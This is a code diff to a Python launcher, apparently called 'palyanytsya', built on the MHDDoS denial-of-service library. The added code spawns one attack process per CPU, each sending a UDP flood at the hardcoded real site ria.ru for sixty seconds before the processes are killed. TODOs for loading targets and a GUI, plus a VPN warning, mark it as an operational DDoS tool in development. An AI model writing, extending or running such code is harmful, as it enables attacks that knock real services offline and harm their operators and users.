@@ -1,10 +1,18 @@
+import logging
+import time
+from multiprocessing import Process
 from sys import argv
+from typing import List
 
 import colorama
+import psutil
 from humanfriendly.terminal import *
 
-from MHDDoS.start import start
+from MHDDoS.start import start, attack
+from MHDDoS.utils.targets import Target
 from utils import print_vpn_warning, supports_complex_colors
+
+logger = logging.getLogger("PALYANYTSYA")
 
 
 def get_flair_string():
@@ -38,17 +46,45 @@ def velyka_kara():
     print_flair()
     print_vpn_warning()
 
-    # override script name
-    argv[0] = "palyanytsya.py"
+    # TODO: read cmdargs
+    # TODO: load targets
+    # TODO: launch processes (one per target)
+    # TODO: launch GUI loop
 
-    if len(argv) < 5:
-        print("Not enough arguments supplied. Please check the reference below:\n")
-        argv.insert(1, "HELP")
+    # # override script name
+    # argv[0] = "palyanytsya.py"
+    #
+    # if len(argv) < 5:
+    #     print("Not enough arguments supplied. Please check the reference below:\n")
+    #     argv.insert(1, "HELP")
 
-    # enable debug to see attack progress
-    argv.append("true")
+    cpu_count = psutil.cpu_count()
+    print(f"Host system has {cpu_count} CPUs available.")
 
-    start()
+    attack_processes: List[Process] = []
+
+    for _ in range(cpu_count):
+        target = Target.parse_from_string("https://ria.ru:443")
+        attack_method = "UDP"
+        attack_process = Process(
+            target=attack,
+            args=(target, attack_method),
+            kwargs={
+                "proxies_file_path": None
+            },
+            daemon=True
+        )
+        attack_processes.append(attack_process)
+        attack_process.start()
+
+    time.sleep(60)
+    for attack_process in attack_processes:
+        attack_process.kill()
+    #
+    # # enable debug to see attack progress
+    # argv.append("true")
+    #
+    # start()
 
 
 if __name__ == '__main__':
